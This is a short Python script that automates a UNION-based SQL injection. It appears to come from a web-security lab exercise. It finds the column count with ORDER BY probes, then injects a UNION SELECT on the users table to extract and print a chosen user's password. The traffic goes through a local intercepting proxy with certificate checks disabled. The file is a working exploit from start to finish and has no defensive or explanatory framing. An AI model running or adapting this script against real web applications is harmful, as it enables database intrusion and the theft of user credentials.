#!/usr/bin/env python3
# sqli-union3.py
import requests
import sys
from bs4 import BeautifulSoup

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1,10):
        sqli = f"' ORDER BY {i}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def get_user(url, username):
    sqli = "' UNION SELECT username, password FROM users--"
    req = requests.get(url+sqli, verify=False, proxies=proxies)
    try:
        if username in req.text:
            print("[-] Trying to inject the payload...")
            print("[-] [{}]".format(sqli))
            soup = BeautifulSoup(req.text, 'html.parser')
            password = soup.body.find(string=username).parent.findNext('td').contents[0]
            print("[-] Found the [{}] password...".format(username))
            print("[-] The [{}] password is [{}]...".format(username, password))
            return True
        return False
    except AttributeError:
        print(f"[-] Can't find the [{username}] user...")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: {} <url> <username>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com administrator".format(sys.argv[0]))
        sys.exit(1)

    print("[-] Figuring out number of columns...")
    num_col = get_col(url)
    if num_col:
        print("[-] The number of columns is [{}]...".format(num_col))
        if not get_user(url, username):
            print(f"[-] Can't find the [{username}] user...")
    else:
        print("[-] SQLi UNION not successful!")